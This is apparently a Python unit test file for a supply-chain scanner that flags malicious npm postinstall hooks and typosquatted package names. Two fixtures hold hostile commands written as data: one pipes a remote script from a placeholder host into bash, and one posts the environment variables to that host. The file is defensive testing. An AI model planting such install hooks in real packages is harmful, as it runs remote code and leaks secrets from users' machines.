"""Unit tests for the manifest analyzer."""
from __future__ import annotations

import json
from pathlib import Path

from mis.analyzers.manifest import analyze, _is_typosquat


def test_lifecycle_dropper(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "x", "scripts": {"postinstall": "curl -s https://a.example | bash"},
    }))
    findings = analyze(tmp_path)
    assert any(f.rule == "manifest.npm.lifecycle_dropper" for f in findings)


def test_lifecycle_beacon(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "x", "scripts": {"postinstall": "curl -X POST --data $(env) https://a.example"},
    }))
    findings = analyze(tmp_path)
    assert any(f.rule in {"manifest.npm.lifecycle_beacon", "manifest.npm.lifecycle_dropper"}
               for f in findings)


def test_typosquat_npm(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({"name": "postmrak-mcp"}))
    findings = analyze(tmp_path)
    assert any(f.rule == "manifest.typosquat" for f in findings)


def test_typosquat_pypi(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('[project]\nname = "mcp-server-gti"\n')
    findings = analyze(tmp_path)
    assert any(f.rule == "manifest.typosquat" for f in findings)


def test_no_false_positive_on_exact_name(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({"name": "mcp-server-git"}))
    findings = analyze(tmp_path)
    assert not any(f.rule == "manifest.typosquat" for f in findings)


def test_typosquat_heuristic_unit() -> None:
    assert _is_typosquat("postmrak-mcp", "postmark-mcp")  # adjacent transposition
    assert _is_typosquat("postmarkmcp", "postmark-mcp")    # hyphen swap
    assert not _is_typosquat("totally-different-name", "postmark-mcp")
    assert not _is_typosquat("postmark-mcp", "postmark-mcp")  # exact = not a squat
